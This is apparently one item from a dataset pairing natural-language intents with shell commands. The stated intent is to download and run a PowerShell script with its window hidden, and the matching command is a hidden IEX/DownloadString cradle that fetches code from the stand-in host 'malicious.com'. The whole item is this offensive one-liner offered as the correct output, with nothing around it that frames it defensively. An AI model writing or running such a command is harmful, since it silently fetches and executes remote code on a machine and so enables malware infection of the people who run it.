# Natural language intent:
# Download and execute a PowerShell script from a specific server with a hidden process.

powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/malicious_script.ps1')"
